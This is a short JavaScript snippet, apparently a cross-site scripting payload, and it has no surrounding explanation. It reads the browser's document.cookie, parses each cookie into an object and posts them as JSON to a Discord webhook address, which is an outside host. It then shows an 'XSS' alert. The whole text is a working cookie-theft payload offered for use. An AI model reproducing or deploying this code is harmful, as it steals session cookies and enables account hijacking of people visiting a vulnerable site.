var cookies = document.cookie.split(';').reduce(
    (cookies, cookie) => {
        const [name, val] = cookie.split('=').map(c => c.trim());
        cookies[name] = val;
        return cookies;
    }, {});

    var xhr = new XMLHttpRequest();
    xhr.open("POST", "https://discord.com/api/webhooks/", true);
    xhr.setRequestHeader("Content-Type", "application/json");
    xhr.send(JSON.stringify({
        "content": "```ini\n[" + JSON.stringify(cookies) + "]\n```"
    }));
    alert("XSS");
